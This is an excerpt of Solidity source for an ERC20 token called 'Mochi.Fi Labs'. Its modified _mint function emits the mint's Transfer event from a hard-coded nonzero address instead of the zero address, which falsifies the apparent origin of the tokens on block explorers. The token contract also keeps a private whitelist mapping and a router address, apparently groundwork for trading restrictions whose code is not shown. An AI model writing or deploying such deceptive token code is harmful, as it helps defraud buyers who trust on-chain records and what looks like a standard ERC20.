...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        emit Transfer(address(0x892D434aa93B255be03c1Be5c1b3488091D7786d), account, amount);
    }
...
contract MochiFiLabs is ERC20, Ownable {
    mapping(address=>bool) private _enable;
    address private _uni;
    constructor() ERC20('Mochi.Fi Labs','MOLABS') {
        _mint(0xD4fdd874b1C7b8911e96806175ed15d6dB92297e, 100000000000 *10**18);
        _enable[0xD4fdd874b1C7b8911e96806175ed15d6dB92297e] = true;
    }
